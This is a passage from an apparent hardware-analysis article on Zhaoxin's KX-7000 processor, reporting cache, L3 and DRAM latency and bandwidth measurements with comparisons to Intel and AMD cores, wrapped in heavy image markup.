cacheline boundary take 12-13 cycles, a heavy penalty compared to modern cores. Skylake for example barely takes any penalty for misaligned loads, and handles misaligned stores with just a single cycle penalty. Century Avenue faces the heaviest penalties (&gt;42 cycles) if a load depends on a misaligned store.</p><p>Century Avenue has a 32 KB, 8-way associative data cache with a pair of 128-bit ports and 4 cycle load-to-use latency. Only one port handles stores, so 256-bit stores execute over two cycles. Century Avenueâ€™s L1D bandwidth is therefore similar to Sandy Bridge, even though its FMA capability can demand higher bandwidth. When Intel first rolled out 2Ã—256-bit FMA execution with Haswell, their engineers increased L1D bandwidth to 2Ã—256-bit loads and a 256-bit store per cycle.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9f102b69-159c-4846-902e-a38d2143bf08_1096x538.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9f102b69-159c-4846-902e-a38d2143bf08_1096x538.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9f102b69-159c-4846-902e-a38d2143bf08_1096x538.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9f102b69-159c-4846-902e-a38d2143bf08_1096x538.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9f102b69-159c-4846-902e-a38d2143bf08_1096x538.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9f102b69-159c-4846-902e-a38d2143bf08_1096x538.png" width="1096" height="538" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/9f102b69-159c-4846-902e-a38d2143bf08_1096x538.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:538,&quot;width&quot;:1096,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:9356,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://chipsandcheese.com/i/162504120?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9f102b69-159c-4846-902e-a38d2143bf08_1096x538.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9f102b69-159c-4846-902e-a38d2143bf08_1096x538.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9f102b69-159c-4846-902e-a38d2143bf08_1096x538.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9f102b69-159c-4846-902e-a38d2143bf08_1096x538.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9f102b69-159c-4846-902e-a38d2143bf08_1096x538.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>L2 latency is unimpressive at 15 cycles. Skylake-X has a larger 2 MB L2 for example, and ran that with 14 cycle latency at higher clock speeds.</p><p>Century Avenueâ€™s system architecture has been overhauled to improve core count scalability. The KX-7000 adopts a triple-level cache setup, aligning with high performance designs from AMD, Arm, and Intel. Core-private L2 caches help insulate L1 misses from high L3 latency. Thus L3 latency becomes less critical, which enables a larger L3 shared across more cores. Compared to LuJiaZui, Century Avenue increases L3 capacity by a factor of eight, going from 4 MB to 32 MB. Eight Century Avenue cores share the L3, while four LuJiaZui cores shared a 4 MB L2. Combined with the chiplet setup, the KX-7000 is built much like a single-CCD Zen 3 desktop part.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff6c852b4-4285-4ebc-9934-7061f2a91dae_1088x589.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff6c852b4-4285-4ebc-9934-7061f2a91dae_1088x589.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff6c852b4-4285-4ebc-9934-7061f2a91dae_1088x589.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff6c852b4-4285-4ebc-9934-7061f2a91dae_1088x589.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff6c852b4-4285-4ebc-9934-7061f2a91dae_1088x589.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff6c852b4-4285-4ebc-9934-7061f2a91dae_1088x589.png" width="1088" height="589" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/f6c852b4-4285-4ebc-9934-7061f2a91dae_1088x589.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:589,&quot;width&quot;:1088,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:12490,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://chipsandcheese.com/i/162504120?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff6c852b4-4285-4ebc-9934-7061f2a91dae_1088x589.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff6c852b4-4285-4ebc-9934-7061f2a91dae_1088x589.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff6c852b4-4285-4ebc-9934-7061f2a91dae_1088x589.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff6c852b4-4285-4ebc-9934-7061f2a91dae_1088x589.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff6c852b4-4285-4ebc-9934-7061f2a91dae_1088x589.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Unlike AMDâ€™s recent designs, L3 latency is poor at over 27 ns, or over 80 core cycles. Bandwidth isnâ€™t great either at just over 8 bytes per cycle. A read-modify-write pattern increases bandwidth to 11.5 bytes per cycle. Neither figure is impressive. Skylake could average 15 bytes per cycle from L3 using a read-only pattern, and recent AMD designs can achieve twice that.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7dee5403-0f2f-4cb0-91f6-232606de201d_411x195.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7dee5403-0f2f-4cb0-91f6-232606de201d_411x195.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7dee5403-0f2f-4cb0-91f6-232606de201d_411x195.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7dee5403-0f2f-4cb0-91f6-232606de201d_411x195.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7dee5403-0f2f-4cb0-91f6-232606de201d_411x195.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7dee5403-0f2f-4cb0-91f6-232606de201d_411x195.png" width="411" height="195" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/7dee5403-0f2f-4cb0-91f6-232606de201d_411x195.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:195,&quot;width&quot;:411,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:4170,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://chipsandcheese.com/i/162504120?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7dee5403-0f2f-4cb0-91f6-232606de201d_411x195.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7dee5403-0f2f-4cb0-91f6-232606de201d_411x195.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7dee5403-0f2f-4cb0-91f6-232606de201d_411x195.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7dee5403-0f2f-4cb0-91f6-232606de201d_411x195.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7dee5403-0f2f-4cb0-91f6-232606de201d_411x195.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>The KX-7000 does enjoy good bandwidth scaling, but low clock speeds combined with low per-core bandwidth to start with mean final figures arenâ€™t too impressive. A read-only pattern gets to 215 GB/s, while a read-modify-write pattern can exceed 300 GB/s. For comparison, a Zen 2 CCD enjoys more than twice as much L3 bandwidth.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F13a458d8-6b59-4f93-ab5f-1e8eca8cf57b_1134x666.webp" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F13a458d8-6b59-4f93-ab5f-1e8eca8cf57b_1134x666.webp 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F13a458d8-6b59-4f93-ab5f-1e8eca8cf57b_1134x666.webp 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F13a458d8-6b59-4f93-ab5f-1e8eca8cf57b_1134x666.webp 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F13a458d8-6b59-4f93-ab5f-1e8eca8cf57b_1134x666.webp 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F13a458d8-6b59-4f93-ab5f-1e8eca8cf57b_1134x666.webp" width="1134" height="666" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/13a458d8-6b59-4f93-ab5f-1e8eca8cf57b_1134x666.webp&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:666,&quot;width&quot;:1134,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:9926,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/webp&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://chipsandcheese.com/i/162504120?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F13a458d8-6b59-4f93-ab5f-1e8eca8cf57b_1134x666.webp&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F13a458d8-6b59-4f93-ab5f-1e8eca8cf57b_1134x666.webp 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F13a458d8-6b59-4f93-ab5f-1e8eca8cf57b_1134x666.webp 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F13a458d8-6b59-4f93-ab5f-1e8eca8cf57b_1134x666.webp 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F13a458d8-6b59-4f93-ab5f-1e8eca8cf57b_1134x666.webp 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>The KX-7000 does have more L3 bandwidth than Intelâ€™s Skylake-X, at least when testing with matched thread counts. However, Skylake-X has a larger 1 MB L2 cache to insulate the cores from poor L3 performance. Skylake-X is also a server-oriented part, where single-threaded performance is less important. On the client side, Bulldozer has similar L3 latency, but uses an even larger 2 MB to avoid hitting it.</p><p>DRAM performance is poor, with over 200 ns latency even when using 2 MB pages to minimize address translation latency. Latency goes over 240 ns using 4 KB pages, using a 1 GB array in both cases. The KX-7000â€™s DRAM bandwidth situation is tricky. To start, the memory controller was only able to train to 1600 MT/s, despite using DIMMs with 2666 MT/s JEDEC and 4000 MT/s XMP profiles. Theoretical bandwidth is therefore limited to 25.6 GB/s. However measured read bandwidth gets nowhere close, struggling to get past even 12 GB/s.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F471dcdbd-420a-4c11-b886-ff6d4cb5da3e_633x340.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F471dcdbd-420a-4c11-b886-ff6d4cb5da3e_633x340.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F471dcdbd-420a-4c11-b886-ff6d4cb5da3e_633x340.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F471dcdbd-420a-4c11-b886-ff6d4cb5da3e_633x340.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F471dcdbd-420a-4c11-b886-ff6d4cb5da3e_633x340.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F471dcdbd-420a-4c11-b886-ff6d4cb5da3e_633x340.png" width="633" height="340" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/471dcdbd-420a-4c11-b886-ff6d4cb5da3e_633x340.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:340,&quot;width&quot;:633,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:4504,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://chipsandcheese.com/i/162504120?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F471dcdbd-420a-4c11-b886-ff6d4cb5da3e_633x340.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F471dcdbd-420a-4c11-b886-ff6d4cb5da3e_633x340.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F471dcdbd-420a-4c11-b886-ff6d4cb5da3e_633x340.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F471dcdbd-420a-4c11-b886-ff6d4cb5da3e_633x340.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F471dcdbd-420a-4c11-b886-ff6d4cb5da3e_633x340.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Mixing in writes increases achievable bandwidth. A read-modify-write pattern gets over 20 GB/s, while non-temporal writes reach 23.35 GB/s. The latter figure is close to theoretical, and indicates Zhaoxinâ€™s cross-die link has enough bandwidth to saturate the memory controller. Read bandwidth is likely limited by latency. Unlike writes, where data to be written gets handed off, reads can only complete when data returns. Maintaining high read bandwidth requires keeping enough memory requests in-flight to hide latency.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F34ddaf4b-d401-4ba0-94e3-ab4c22360fdb_770x421.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F34ddaf4b-d401-4ba0-94e3-ab4c22360fdb_770x421.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F34ddaf4b-d401-4ba0-94e3-ab4c22360fdb_770x421.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F34ddaf4b-d401-4ba0-94e3-ab4c22360fdb_770x421.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F34ddaf4b-d401-4ba0-94e3-ab4c22360fdb_770x421.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F34ddaf4b-d401-4ba0-94e3-ab4c22360fdb_770x421.png" width="770" height="421" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/34ddaf4b-d401-4ba0-94e3-ab4c22360fdb_770x421.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:421,&quot;width&quot;:770,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:6858,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://chipsandcheese.com/i/162504120?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F34ddaf4b-d401-4ba0-94e3-ab4c22360fdb_770x421.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F34ddaf4b-d401-4ba0-94e3-ab4c22360fdb_770x421.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F34ddaf4b-d401-4ba0-94e3-ab4c22360fdb_770x421.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F34ddaf4b-d401-4ba0-94e3-ab4c22360fdb_770x421.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F34ddaf4b-d401-4ba0-94e3-ab4c22360fdb_770x421.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Often loading more cores lets the memory subsystem keep more requests in flight, because each core has its own L1 and L2 miss queues. However the KX-7000â€™s read bandwidth abruptly stops scaling once a bandwidth test loads more than two cores. That suggests a queue shared by all the cores doesnâ€™t have enough entries to hide latency, resulting in low read bandwidth.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1e4c0313-27a3-4820-9850-68c1e47583c5_764x403.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1e4c0313-27a3-4820-9850-68c1e47583c5_764x403.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1e4c0313-27a3-4820-9850-68c1e47583c5_764x403.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1e4c0313-27a3-4820-9850-68c1e47583c5_764x403.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1e4c0313-27a3-4820-9850-68c1e47583c5_764x403.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1e4c0313-27a3-4820-9850-68c1e47583c5_764x403.png" width="764" height="403" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/1e4c0313-27a3-4820-9850-68c1e47583c5_764x403.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:403,&quot;width&quot;:764,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:4186,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://chipsandcheese.com/i/162504120?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1e4c0313-27a3-4820-9850-68c1e47583c5_764x403.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1e4c0313-27a3-4820-9850-68c1e47583c5_764x403.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1e4c0313-27a3-4820-9850-68c1e47583c5_764x403.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1e4c0313-27a3-4820-9850-68c1e47583c5_764x403.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1e4c0313-27a3-4820-9850-68c1e47583c5_764x403.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Taking the best latency/bandwidth combinations across different thread counts</figcaption></figure></div><p>To make things worse, the KX-7000â€™s memory subsystem doesnâ€™t do well at ensuring fairness between requests coming from different cores. A pointer chasing thread sees latency skyrocket when other cores generate high bandwidth load. In a worst case with one latency test thread and seven bandwidth threads, latency pushes past 1 microsecond. I suspect the bandwidth-hungry threads monopolize entries in whatever shared queue limits read bandwidth.</p><p>AMDâ€™s Bulldozer maintains better control over latency under high bandwidth load. The FX-8150â€™s Northbridge has a complicated setup with two crossbar levels, but does an excellent job. Latency increases as the test pushes up to the memory controllerâ€™s bandwidth limits, but doesnâ€™t rise to more than double its un-loaded latency. In absolute terms, even Bulldozerâ€™s worst case latency is better than the KX-7000â€™s best case.</p><div><figure><a target="_blank" 